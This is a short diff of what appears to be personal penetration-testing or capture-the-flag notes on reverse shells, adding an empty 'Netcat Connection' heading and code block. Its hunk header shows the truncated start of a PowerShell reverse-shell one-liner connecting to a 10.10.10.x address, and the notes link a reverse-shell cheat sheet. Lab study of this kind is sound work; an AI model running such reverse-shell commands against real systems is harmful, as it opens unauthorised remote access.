@@ -50,6 +50,11 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ## Things to know
 - Command executed depend on the OS of the target
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
+#### Netcat Connection
+```
+
+```
+
 
 ## Boxes where I used this
 - [[]]
